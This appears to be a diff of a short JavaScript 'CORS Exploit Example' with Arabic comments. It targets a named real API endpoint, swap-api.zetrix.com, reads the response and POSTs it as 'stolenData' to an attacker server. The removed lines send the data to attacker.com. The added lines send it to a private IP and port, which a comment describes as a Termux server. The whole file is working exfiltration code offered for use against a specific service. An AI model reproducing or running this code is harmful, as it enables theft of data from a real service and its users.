@@ -1,38 +1,26 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CORS Exploit Example</title>
-</head>
-<body>
-    <h1>Exploit CORS Misconfiguration</h1>
-    <button onclick="exploitCORS()">استغلال الثغرة</button>
-    <script>
-        function exploitCORS() {
-            const targetUrl = "https://swap-api.zetrix.com/some/endpoint"; // ضع رابط الـ API المستهدف
-            fetch(targetUrl, {
-                method: "GET",
+<script>
+    function exploitCORS() {
+        const targetUrl = "https://swap-api.zetrix.com/some/endpoint"; // رابط الـ API المستهدف
+        fetch(targetUrl, {
+            method: "GET",
+            headers: {
+                'X-Custom-Header': 'SomeValue'
+            }
+        })
+        .then(response => response.text())
+        .then(data => {
+            // إرسال البيانات المسروقة إلى الخادم الذي يعمل على Termux
+            console.log("Data received:", data);
+            fetch('http://10.21.52.111:3000/stealData', { // استبدل <YOUR_TERMUX_IP> بعنوان جهازك
+                method: 'POST',
                 headers: {
-                    'X-Custom-Header': 'SomeValue'
-                }
-            })
-            .then(response => response.text())
-            .then(data => {
-                // إرسال البيانات إلى سيرفر المهاجم
-                console.log("Data received:", data);
-                fetch('https://attacker.com/stealData', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({ stolenData: data })
-                });
-            })
-            .catch(error => {
-                console.error('Error:', error);
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({ stolenData: data })
             });
-        }
-    </script>
-</body>
-</html>
+        })
+        .catch(error => {
+            console.error('Error:', error);
+        });
+    }
+</script>
